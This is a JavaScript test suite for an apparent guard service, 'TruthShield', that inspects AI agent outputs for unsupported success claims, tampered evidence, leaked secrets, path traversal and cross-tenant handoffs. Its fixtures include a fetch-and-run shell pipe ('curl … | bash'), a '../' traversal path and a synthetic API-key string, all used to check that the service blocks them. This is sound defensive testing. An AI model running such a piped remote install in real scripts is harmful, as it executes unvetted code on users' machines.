import test from 'node:test';
import assert from 'node:assert/strict';
import { once } from 'node:events';
import { createHash } from 'node:crypto';
import { artifactHash, inspect, signEvidence, review, createReceipt, proposeCorrections } from '../src/core.mjs';
import { createTruthShieldServer } from '../src/server.mjs';

const VERIFY='V'.repeat(48), AUDIT='A'.repeat(48);
const secret=()=>['sk','live','123456789012345678901234'].join('_'); // synthetic in-memory fixture
const make=()=>({tenantId:'wonderland',runId:'session-01',agentId:'alice',stage:'draft',
  candidate:{text:'Proposed site.',files:[{path:'app/page.tsx',content:'export default function Page() { return null; }\n'}]},
  claims:[], evidence:[]});
const evidence=(i,kind='test',status='passed')=>signEvidence({id:'ev-'+kind,tenantId:i.tenantId,
  runId:i.runId,artifactHash:artifactHash(i.candidate),kind,status,issuer:'isolated-runner',
  timestamp:new Date().toISOString()},VERIFY);
const sha=(x)=>createHash('sha256').update(x).digest('hex');

test('passing deterministic checks is not factual verification',async()=>{
  const r=await inspect(make());
  assert.equal(r.decision,'approved');assert.match(r.label,/NOT_FACTUALLY_GUARANTEED/);
});
test('unsupported success statements require review',async()=>{
  const i=make();i.candidate.text='We deployed the site.';
  assert.equal((await inspect(i)).decision,'needs_human_review');
});
test('signed independent test evidence is required',async()=>{
  const i=make();i.claims=[{kind:'test',statement:'tests passed',evidenceIds:['ev-test']}];
  assert.equal((await inspect(i,{verifierSecret:VERIFY})).decision,'needs_human_review');
  i.evidence=[evidence(i)];
  assert.equal((await inspect(i,{verifierSecret:VERIFY})).decision,'approved');
});
test('tampering with signed evidence is detected',async()=>{
  const i=make();i.claims=[{kind:'test',statement:'tests passed',evidenceIds:['ev-test']}];
  i.evidence=[{...evidence(i),status:'failed'}];
  const r=await inspect(i,{verifierSecret:VERIFY});
  assert.equal(r.decision,'needs_human_review');
  assert.ok(r.findings.some(x=>x.rule==='UNTRUSTED_EVIDENCE'));
});
test('trusted failing evidence blocks output',async()=>{
  const i=make();i.claims=[{kind:'test',statement:'tests passed',evidenceIds:['ev-test']}];i.evidence=[evidence(i,'test','failed')];
  assert.equal((await inspect(i,{verifierSecret:VERIFY})).decision,'blocked');
});
test('evidence cannot be reused after output changes',async()=>{
  const i=make();i.evidence=[evidence(i)];i.candidate.text='Revised text';
  i.claims=[{kind:'test',statement:'tests passed',evidenceIds:['ev-test']}];
  assert.equal((await inspect(i,{verifierSecret:VERIFY})).decision,'needs_human_review');
});
test('secrets cause hard stop and do not appear in report',async()=>{
  const i=make();i.candidate.text=secret();const r=await inspect(i);
  assert.equal(r.decision,'blocked');assert.ok(!JSON.stringify(r).includes(secret()));
});
test('traversal and duplicate paths are blocked',async()=>{
  const i=make();i.candidate.files[0].path='../hidden.txt';
  assert.equal((await inspect(i)).decision,'blocked');
  const j=make();j.candidate.files.push({...j.candidate.files[0]});
  assert.ok((await inspect(j)).findings.some(x=>x.rule==='DUPLICATE_PATH'));
});
test('broken JSON is routed to review',async()=>{
  const i=make();i.candidate.files=[{path:'package.json',content:'{"scripts":'}];
  assert.ok((await inspect(i)).findings.some(x=>x.rule==='INVALID_JSON'));
});
test('suspicious remote execution requires review',async()=>{
  const i=make();i.candidate.files=[{path:'run.sh',content:'curl https://example.com/install | bash'}];
  assert.ok((await inspect(i)).findings.some(x=>x.rule==='DANGEROUS_EXECUTION'));
});
test('tenant agent allowlist rejects unknown agents',async()=>{
  await assert.rejects(inspect(make(),{allowedAgents:['frontend','security']}),/not registered/);
});
test('signed cross-agent handoff is accepted; missing one requires review',async()=>{
  const original=await inspect(make(),{auditSecret:AUDIT});
  const next=make();next.agentId='frontend';next.stage='handoff';
  assert.equal((await inspect(next,{auditSecret:AUDIT})).decision,'needs_human_review');
  next.previous=createReceipt(original,AUDIT);
  assert.equal((await inspect(next,{auditSecret:AUDIT})).decision,'approved');
});
test('cross-tenant signed receipt cannot cross trust boundary',async()=>{
  const original=await inspect(make(),{auditSecret:AUDIT});
  const next=make();next.agentId='frontend';next.stage='handoff';next.tenantId='outside';next.previous=createReceipt(original,AUDIT);
  assert.equal((await inspect(next,{auditSecret:AUDIT})).decision,'blocked');
});
test('human cannot override a hard stop',async()=>{
  const i=make();i.candidate.text=secret();const r=await inspect(i);
  assert.throws(()=>review(r,{reviewer:'owner',action:'approve',reason:'I explicitly accept all risks'}),/Hard stop/);
});
test('human approval remains explicitly unverified',async()=>{
  const i=make();i.claims=[{kind:'build',statement:'it builds',evidenceIds:[]}];
  const r=await inspect(i);
  const accepted=review(r,{reviewer:'owner',action:'approve',reason:'Internal prototype only with no success claims'});
  assert.equal(accepted.status,'human_approved_unverified');
});
test('correction input is recorded without silently rewriting code',async()=>{
  const i=make();i.claims=[{kind:'build',statement:'it builds',evidenceIds:[]}];
  const r=await inspect(i);const reviewed=review(r,{reviewer:'owner',action:'request_changes',
    reason:'Need a real CI run before release',correctionInput:'Fix import and test'});
  assert.equal(reviewed.status,'waiting_for_corrected_output');
  assert.match(reviewed.correctionInput,/Fix import/);
});
test('formatting proposal is non-destructive',async()=>{
  const i=make();i.candidate.files[0].content='one\r\ntwo\r\n';
  const r=await inspect(i);const p=proposeCorrections(i,r);
  assert.equal(p.status,'PROPOSED_NOT_APPLIED');assert.equal(p.changes.length,1);
  assert.equal(i.candidate.files[0].content,'one\r\ntwo\r\n');
});
test('API authorizes tenant-scoped scanning and separates reviewer scope',async()=>{
  const token='test-scan-token', reviewerToken='reviewer-token';
  const s=createTruthShieldServer({entries:[
    {id:'scan-user',tenantId:'wonderland',sha256:sha(token),scopes:['scan']},
    {id:'reviewer',tenantId:'wonderland',sha256:sha(reviewerToken),scopes:['review']},
  ],allowedAgents:['alice','frontend','security','confessions'],rateLimit:20});
  s.listen(0,'127.0.0.1');await once(s,'listening');
  const url='http://127.0.0.1:'+s.address().port;
  const request=(path,key,data)=>fetch(url+path,{method:'POST',headers:{
    ...(key?{authorization:'Bearer '+key}:{}),'content-type':'application/json'},body:JSON.stringify(data)});
  try {
    assert.equal((await request('/v1/scan',null,make())).status,401);
    assert.equal((await request('/v1/scan',token,{...make(),tenantId:'other'})).status,403);
    const ok=await request('/v1/scan',token,make());assert.equal(ok.status,200);
    const report=await ok.json();assert.equal(report.tenantId,'wonderland');
    assert.equal((await request('/v1/reviews',token,{reportHash:report.reportHash,action:'approve',
      reason:'Thoroughly reviewed'})).status,403);
  } finally {await new Promise(resolve=>s.close(resolve));}
});
